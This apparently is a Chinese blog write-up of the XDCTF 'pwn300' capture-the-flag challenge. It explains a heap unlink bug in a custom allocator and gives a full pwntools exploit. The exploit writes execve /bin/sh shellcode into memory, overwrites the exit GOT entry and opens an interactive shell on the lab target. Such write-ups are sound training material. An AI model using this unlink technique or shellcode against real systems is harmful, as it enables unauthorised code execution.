---  
layout: post  
title: "xdctf-pwn300"  
date: 2015-10-05 12:42:17 +0800  
comments: true  
categories:   
---  
###0x00 分析  
程序模拟了堆，可以unlink  
  
	  v2 = a1 - 16;  
	    now_len = *(_DWORD *)(a1 - 16 + 4);  
	    now_next = *(_DWORD *)(a1 - 16 + 8);  
	    if ( now_next )  
	      *(_DWORD *)(now_next + 4) = now_len;      // next加4指向的内容等于now_len  
	    if ( now_len )  
	      *(_DWORD *)(now_len + 8) = now_next;      // len加8指向的内存等于now_next  
	    *(_DWORD *)(v2 + 4) = *(_DWORD *)(addr_sbrk + 4);// len=addr_sbrk+4  
  
  
sbrk zone looks like  
  
	|size	|next	|last  
	last is remain space  
solution is  
m1  
m2  
m3  
m4  
e4	/bin/sh  
e1  
payload  = 'a'*116  
payload += addr-4  
payload += addr  
  
  
###0x01 exp  
  
	from pwn import *  
  
	r = remote('192.168.56.102', 6666)  
	#r = process('./pwn300')  
  
	numofgirls = 0x804b04c  
	buf = 0x804B060  
	exit_got = 0x0804B01C  
  
  
	def add():  
		print r.recvuntil("Your Choice:")  
		r.sendline('1')  
		print r.recvuntil("Give the type of the Girl:")  
		r.sendline('0')  
	def edit(id, type, text):  
		print r.recvuntil("Your Choice:")  
		r.sendline('3')  
		print r.recvuntil("Give the Girl id to edit:")  
		r.sendline(str(id))  
		print r.recvuntil("Give the type to edit:")  
		r.sendline(str(type))  
		print r.recvuntil("Give your Girl:")  
		r.sendline(text)  
	def dele(id):  
		print r.recvuntil("Your Choice:")  
		r.sendline('2')  
		print r.recvuntil("Give the Girl id to delete:")  
		r.sendline(str(id))  
	def show(id):  
		print r.recvuntil("Your Choice:")  
		r.sendline('4')  
		print r.recvuntil("Give the Girlid to print:")  
		r.sendline(str(id))  
		data = r.recvuntil("Let")  
		print data  
		return data[1:-3]  
		  
  
	def write_addr(address, cont):  
		add()  
		add()  
		add()  
		add()  
		  
		addr = 0x0804B058  
		payload  = 'a'*116	#unlink change bss  
		payload += p32(addr)  
		payload += p32(addr+4)  
		edit(0, 1, payload)  
		dele(1)  
  
		payload  = 'bbbb'  
		payload += p32(address)  
		payload += p32(numofgirls)  
		edit(0, 0, payload)  
		payload  = cont  
		edit(0, 0, payload)  
		edit(1, 0, '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')  
  
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"  
	shellcode_addr = 0x804b0a0  
  
	write_addr(shellcode_addr , shellcode)  
	write_addr(exit_got, p32(shellcode_addr))  
  
	r.interactive()  
  
  
